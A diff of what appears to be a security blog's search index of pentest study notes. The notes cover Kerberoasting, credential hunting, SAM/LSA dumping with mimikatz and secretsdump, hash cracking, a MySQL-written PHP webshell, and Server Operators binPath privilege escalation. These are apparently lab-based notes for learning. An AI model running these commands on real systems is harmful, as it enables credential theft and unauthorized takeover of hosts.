-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Kerberoasting &amp; ASREPRoasting</category>
-      </categories>
-      <tags>
-        <tag>impacket-GetNPUsers</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux Credential Hunting</title>
-    <url>/2025/11/27/Linux-Credential-Hunting/</url>
-    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
-
-<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>config-files</tag>
-        <tag>history-file</tag>
-        <tag>db-files</tag>
-        <tag>cronjobs-enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -1591,45 +1670,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
-
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
-
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-SAM</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RDP Exploitation</title>
     <url>/2025/12/04/RDP-Exploitation/</url>
     <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
@@ -1670,46 +1710,6 @@
         <tag>RDP-Session-Hijacking</tag>
         <tag>Crowbar</tag>
         <tag>Hydra</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -1839,6 +1839,53 @@
         <category>Windows</category>
         <category>Privesc</category>
         <category>User</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Server Operators</title>
+    <url>/2026/03/06/Server-Operators/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Members of the <code>Server Operators</code> group may have <code>SERVICE_ALL_ACCESS</code> or <code>SERVICE_CHANGE_CONFIG</code> permissions on certain services. These permissions allow modification of the service configuration, including the <code>binPath</code>.</p>
+<p>➜ If the targeted service runs as <code>LocalSystem</code>, modifying its <code>binPath</code> allows execution of arbitrary commands with <code>NT AUTHORITY\SYSTEM</code> privileges, resulting in full local privilege escalation.</p>
+</blockquote>
+<h3 id="Enumerating-Services-Running-as-LocalSystem-and-Controllable-by-Server-Operators"><a href="#Enumerating-Services-Running-as-LocalSystem-and-Controllable-by-Server-Operators" class="headerlink" title="Enumerating Services Running as LocalSystem and Controllable by Server Operators"></a>Enumerating Services Running as <code>LocalSystem</code> and Controllable by <code>Server Operators</code></h3><blockquote>
+<p>To identify exploitable services, we enumerate all services running under the <code>LocalSystem</code> account and filter those where the <code>Server Operators</code> group has sufficient permissions.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.StartName <span class="operator">-eq</span> <span class="string">&quot;LocalSystem&quot;</span>&#125; | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$sd</span> = sc.exe sdshow <span class="variable">$_</span>.Name</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sd</span> <span class="operator">-match</span> <span class="string">&quot;\(A;;(FA|[^;]*CC[^;]*);;;SO\)&quot;</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;[+] Exploitable Service: <span class="variable">$</span>(<span class="variable">$_</span>.Name)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    StartName : <span class="variable">$</span>(<span class="variable">$_</span>.StartName)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    State     : <span class="variable">$</span>(<span class="variable">$_</span>.State)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    Path      : <span class="variable">$</span>(<span class="variable">$_</span>.PathName)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; &gt; C:\Users\server_adm\Desktop\exploitable_services.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: AppReadiness</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Stopped</span><br><span class="line">    Path      : C:\Windows\System32\svchost.exe <span class="literal">-k</span> AppReadiness <span class="literal">-p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: MozillaMaintenance</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Stopped</span><br><span class="line">    Path      : <span class="string">&quot;C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: Themes</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Running</span><br><span class="line">    Path      : C:\Windows\System32\svchost.exe <span class="literal">-k</span> netsvcs <span class="literal">-p</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Selecting-a-Safe-Exploitation-Target"><a href="#Selecting-a-Safe-Exploitation-Target" class="headerlink" title="Selecting a Safe Exploitation Target"></a>Selecting a Safe Exploitation Target</h3><blockquote>
+<p>➜ To minimize operational impact and maintain system stability, priority should be given to services that meet the following criteria:</p>
+<ul>
+<li>Third-party services</li>
+<li>Custom services</li>
+<li>Non-critical Windows services</li>
+</ul>
+<p>And :</p>
+<ul>
+<li>Services configured with <code>START_TYPE : DEMAND_START</code></li>
+</ul>
+</blockquote>
+<h3 id="Modifying-the-Service-Binary-Path"><a href="#Modifying-the-Service-Binary-Path" class="headerlink" title="Modifying the Service Binary Path"></a>Modifying the Service Binary Path</h3><blockquote>
+<p>➜ By modifying the <code>service binary path</code> and injecting a malicious command, we can add our user to the local Administrators group.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\server_adm&gt; sc.exe config MozillaMaintenance binPath= <span class="string">&quot;cmd.exe /c net localgroup Administrators server_adm /add&quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
+
+<h3 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h3><blockquote>
+<p>➜ Starting the service fails, which is expected because the service binary path was replaced with cmd.exe, which executes the malicious command as SYSTEM and exits immediately without behaving like a real service, causing Windows to report a timeout while the payload still runs successfully.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\server_adm&gt; sc.exe <span class="built_in">start</span> MozillaMaintenance</span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] StartService FAILED <span class="number">1053</span>:</span><br><span class="line">The service did not respond to the <span class="built_in">start</span> or control request <span class="keyword">in</span> a timely fashion.</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜ Then we can dump hashes from the DC.</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
       </categories>
   </entry>
   <entry>
@@ -2044,50 +2091,140 @@
       </tags>
   </entry>
   <entry>
-    <title>Server Operators</title>
-    <url>/2026/03/06/Server-Operators/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Members of the <code>Server Operators</code> group may have <code>SERVICE_ALL_ACCESS</code> or <code>SERVICE_CHANGE_CONFIG</code> permissions on certain services. These permissions allow modification of the service configuration, including the <code>binPath</code>.</p>
-<p>➜ If the targeted service runs as <code>LocalSystem</code>, modifying its <code>binPath</code> allows execution of arbitrary commands with <code>NT AUTHORITY\SYSTEM</code> privileges, resulting in full local privilege escalation.</p>
+    <title>Windows Enumeration</title>
+    <url>/2026/06/09/Windows-Enumeration/</url>
+    <content><![CDATA[<h1 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h1><blockquote>
+<p>Operating system version and build</p>
 </blockquote>
-<h3 id="Enumerating-Services-Running-as-LocalSystem-and-Controllable-by-Server-Operators"><a href="#Enumerating-Services-Running-as-LocalSystem-and-Controllable-by-Server-Operators" class="headerlink" title="Enumerating Services Running as LocalSystem and Controllable by Server Operators"></a>Enumerating Services Running as <code>LocalSystem</code> and Controllable by <code>Server Operators</code></h3><blockquote>
-<p>To identify exploitable services, we enumerate all services running under the <code>LocalSystem</code> account and filter those where the <code>Server Operators</code> group has sufficient permissions.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.StartName <span class="operator">-eq</span> <span class="string">&quot;LocalSystem&quot;</span>&#125; | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$sd</span> = sc.exe sdshow <span class="variable">$_</span>.Name</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sd</span> <span class="operator">-match</span> <span class="string">&quot;\(A;;(FA|[^;]*CC[^;]*);;;SO\)&quot;</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;[+] Exploitable Service: <span class="variable">$</span>(<span class="variable">$_</span>.Name)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    StartName : <span class="variable">$</span>(<span class="variable">$_</span>.StartName)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    State     : <span class="variable">$</span>(<span class="variable">$_</span>.State)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    Path      : <span class="variable">$</span>(<span class="variable">$_</span>.PathName)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; &gt; C:\Users\server_adm\Desktop\exploitable_services.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: AppReadiness</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Stopped</span><br><span class="line">    Path      : C:\Windows\System32\svchost.exe <span class="literal">-k</span> AppReadiness <span class="literal">-p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: MozillaMaintenance</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Stopped</span><br><span class="line">    Path      : <span class="string">&quot;C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: Themes</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Running</span><br><span class="line">    Path      : C:\Windows\System32\svchost.exe <span class="literal">-k</span> netsvcs <span class="literal">-p</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Selecting-a-Safe-Exploitation-Target"><a href="#Selecting-a-Safe-Exploitation-Target" class="headerlink" title="Selecting a Safe Exploitation Target"></a>Selecting a Safe Exploitation Target</h3><blockquote>
-<p>➜ To minimize operational impact and maintain system stability, priority should be given to services that meet the following criteria:</p>
-<ul>
-<li>Third-party services</li>
-<li>Custom services</li>
-<li>Non-critical Windows services</li>
-</ul>
-<p>And :</p>
-<ul>
-<li>Services configured with <code>START_TYPE : DEMAND_START</code></li>
-</ul>
-</blockquote>
-<h3 id="Modifying-the-Service-Binary-Path"><a href="#Modifying-the-Service-Binary-Path" class="headerlink" title="Modifying the Service Binary Path"></a>Modifying the Service Binary Path</h3><blockquote>
-<p>➜ By modifying the <code>service binary path</code> and injecting a malicious command, we can add our user to the local Administrators group.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\server_adm&gt; sc.exe config MozillaMaintenance binPath= <span class="string">&quot;cmd.exe /c net localgroup Administrators server_adm /add&quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
-
-<h3 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h3><blockquote>
-<p>➜ Starting the service fails, which is expected because the service binary path was replaced with cmd.exe, which executes the malicious command as SYSTEM and exits immediately without behaving like a real service, causing Windows to report a timeout while the payload still runs successfully.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\server_adm&gt; sc.exe <span class="built_in">start</span> MozillaMaintenance</span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] StartService FAILED <span class="number">1053</span>:</span><br><span class="line">The service did not respond to the <span class="built_in">start</span> or control request <span class="keyword">in</span> a timely fashion.</span><br></pre></td></tr></table></figure>
